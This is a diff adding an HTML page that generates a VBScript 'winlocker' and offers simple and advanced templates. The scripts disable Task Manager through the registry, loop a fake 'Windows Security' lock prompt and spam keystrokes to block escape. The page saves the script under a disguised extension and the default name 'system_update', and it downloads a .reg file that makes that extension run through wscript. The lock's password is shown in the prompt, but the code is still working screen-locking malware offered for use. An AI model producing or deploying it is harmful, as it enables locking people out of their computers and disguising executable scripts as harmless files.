@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Create .myformat VBS File</title>
+    <style>
+        body { font-family: Arial; margin: 40px; }
+        textarea { width: 100%; height: 200px; }
+        button { padding: 10px 20px; margin: 10px 0; }
+        .container { max-width: 800px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Create .myformat VBS Executable</h2>
+        
+        <p>Enter your VBS winlocker code:</p>
+        <textarea id="code">password = "123"
+Set objShell = CreateObject("WScript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+' Create fullscreen window
+objShell.Run "cmd.exe /c mode con: cols=80 lines=25", 0, True
+
+' Disable task manager
+objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
+
+' Create lock screen loop
+Do While True
+    ' Create message box for password
+    input = InputBox("SYSTEM LOCKED" & vbCrLf & vbCrLf & "Enter password to unlock:" & vbCrLf & "Password: 123", "Windows Security")
+    
+    If input = password Then
+        ' Re-enable task manager
+        On Error Resume Next
+        objShell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr"
+        MsgBox "System unlocked!", vbInformation, "Success"
+        Exit Do
+    ElseIf input = "" Then
+        ' Do nothing if cancelled
+    Else
+        MsgBox "Wrong password! Try again.", vbCritical, "Error"
+    End If
+Loop</textarea>
+        
+        <p>Filename:</p>
+        <input type="text" id="filename" value="system_update" style="width: 300px;">
+        
+        <br>
+        <button onclick="createVBSMyFormat()">Create .myformat VBS File</button>
+        
+        <script>
+            function createVBSMyFormat() {
+                const code = document.getElementById('code').value;
+                const basename = document.getElementById('filename').value.replace('.myformat', '');
+                
+                // Create the .myformat file with VBS content
+                const myformatContent = `' VBScript encoded in .myformat file
+${code}
+`;
+                
+                // Download .myformat file
+                const blob = new Blob([myformatContent], { type: 'text/plain' });
+                const link = document.createElement('a');
+                link.href = URL.createObjectURL(blob);
+                link.download = basename + '.myformat';
+                link.click();
+                
+                // Create registry file to associate .myformat with wscript
+                createVBSRegistryFile(basename);
+            }
+            
+            function createVBSRegistryFile(basename) {
+                const regContent = `Windows Registry Editor Version 5.00
+
+[HKEY_CLASSES_ROOT\\.myformat]
+@="MyFormatVBFile"
+
+[HKEY_CLASSES_ROOT\\MyFormatVBFile\\shell\\open\\command]
+@="wscript.exe \"%1\""
+
+[HKEY_CURRENT_USER\\Software\\Classes\\.myformat]
+@="MyFormatVBFile"
+
+[HKEY_CURRENT_USER\\Software\\Classes\\MyFormatVBFile\\shell\\open\\command]
+@="wscript.exe \"%1\""
+`;
+                
+                const regBlob = new Blob([regContent], { type: 'text/plain' });
+                const regLink = document.createElement('a');
+                regLink.href = URL.createObjectURL(regBlob);
+                regLink.download = 'associate_vbs_myformat.reg';
+                regLink.click();
+                
+                setTimeout(() => {
+                    alert('Two files downloaded:\\n1. ' + basename + '.myformat - The VBS executable\\n2. associate_vbs_myformat.reg - Registry association\\n\\nFIRST: Double-click associate_vbs_myformat.reg and click Yes\\nTHEN: Double-click ' + basename + '.myformat to run the VBS winlocker');
+                }, 500);
+            }
+        </script>
+
+        <h3>Pre-made VBS Winlocker Examples:</h3>
+        <button onclick="loadSimpleLocker()">Load Simple Winlocker</button>
+        <button onclick="loadAdvancedLocker()">Load Advanced Winlocker</button>
+
+        <script>
+            function loadSimpleLocker() {
+                document.getElementById('code').value = `password = "123"
+Do While True
+    input = InputBox("SYSTEM LOCKED" & vbCrLf & vbCrLf & "Enter password: 123", "Windows Lock")
+    If input = password Then
+        MsgBox "Unlocked!", vbInformation
+        Exit Do
+    Else
+        MsgBox "Wrong password!", vbCritical
+    End If
+Loop`;
+            }
+            
+            function loadAdvancedLocker() {
+                document.getElementById('code').value = `password = "123"
+Set ws = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+' Disable keys
+ws.RegWrite "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\DisableTaskMgr", 1, "REG_DWORD"
+ws.SendKeys "^{ESC}"
+
+' Create persistent lock
+Do While True
+    ws.AppActivate "Windows Lock"
+    If Not fso.FileExists("C:\\\\Windows\\\\System32\\\\taskmgr.exe") Then
+        ' Block task manager
+    End If
+    
+    input = InputBox("SYSTEM LOCKED BY ADMIN" & vbCrLf & vbCrLf & "Password: 123" & vbCrLf & "Contact administrator for access.", "CRITICAL SYSTEM LOCK")
+    
+    If input = password Then
+        ws.RegWrite "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\DisableTaskMgr", 0, "REG_DWORD"
+        MsgBox "Access granted. System unlocked.", vbInformation
+        Exit Do
+    ElseIf input <> "" Then
+        MsgBox "ACCESS DENIED! Invalid credentials.", vbCritical
+    End If
+    
+    ' Prevent escape
+    For i = 1 To 10
+        ws.SendKeys "^{ESC}"
+        WScript.Sleep 100
+    Next
+Loop`;
+            }
+        </script>
+
+        <h3>How to Use:</h3>
+        <ol>
+            <li>Click "Create .myformat VBS File" - two files download</li>
+            <li>Double-click <code>associate_vbs_myformat.reg</code> and click Yes</li>
+            <li>Double-click the <code>.myformat</code> file</li>
+            <li>The VBS winlocker will execute immediately</li>
+        </ol>
+
+        <h3>What the VBS winlocker does:</h3>
+        <ul>
+            <li>Creates password prompt (password: 123)</li>
+            <li>Locks system until correct password entered</li>
+            <li>Can disable task manager</li>
+            <li>Runs in background</li>
+            <li>Hard to close without password</li>
+        </ul>
+    </div>
+</body>
+</html>
